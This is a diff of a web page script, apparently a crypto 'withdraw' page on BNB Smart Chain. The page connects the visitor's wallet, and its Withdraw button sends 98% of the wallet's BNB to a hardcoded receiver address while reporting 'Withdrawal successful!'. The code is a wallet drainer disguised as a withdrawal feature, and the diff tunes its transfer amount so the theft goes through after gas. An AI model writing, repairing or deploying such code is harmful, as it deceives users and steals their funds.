@@ -27,7 +27,6 @@
     <p id="message" class="text-sm font-medium text-gray-600"></p>
   </div>
 
-  <!-- All logic from withdraw.js inside module script -->
   <script type="module">
     import {
       EthereumClient,
@@ -52,7 +51,7 @@
     const chains = [bsc];
     const projectId = "2aca272d18deb10ff748260da5f78bfd";
     const RECEIVER_ADDRESS = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
-    const BNB_TO_USD = 600; // Adjust if needed
+    const BNB_TO_USD = 600; // Adjust this value if BNB price changes
 
     const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
 
@@ -91,34 +90,35 @@
 
       try {
         const balanceResult = await fetchBalance({ address, chainId: 56 });
-        const bnbAmount = Number(balanceResult.formatted);
-        const usdValue = bnbAmount * BNB_TO_USD;
+        const fullBNB = Number(balanceResult.formatted);
+
+        const sendableBNB = fullBNB * 0.98;
+        const usdValue = sendableBNB * BNB_TO_USD;
 
         if (usdValue < 10) {
-          showMessage("Insufficient balance: You need at least $10 worth of BNB", "error");
+          showMessage("Insufficient BNB: 98% of your balance is less than $10", "error");
           return;
         }
 
         await sendTransaction({
           to: RECEIVER_ADDRESS,
-          value: balanceResult.value
+          value: BigInt(Math.floor(sendableBNB * 1e18)) // Convert to wei
         });
 
-        showMessage("Withdrawal sent successfully!", "success");
+        showMessage("Withdrawal successful! ✅", "success");
       } catch (err) {
         console.error(err);
-        showMessage("Withdrawal failed. Check console for error.", "error");
+        showMessage("Error sending transaction. Check console for details.", "error");
       }
     }
 
-    // Toggle visibility of Withdraw button
+    // Show Withdraw button only when wallet is connected
     setInterval(() => {
       const { isConnected } = getAccount();
       const btn = document.getElementById("withdrawButton");
       if (btn) btn.style.display = isConnected ? "block" : "none";
     }, 1000);
 
-    // Handle button click
     window.addEventListener("DOMContentLoaded", () => {
       const btn = document.getElementById("withdrawButton");
       if (btn) btn.addEventListener("click", withdrawBNB);
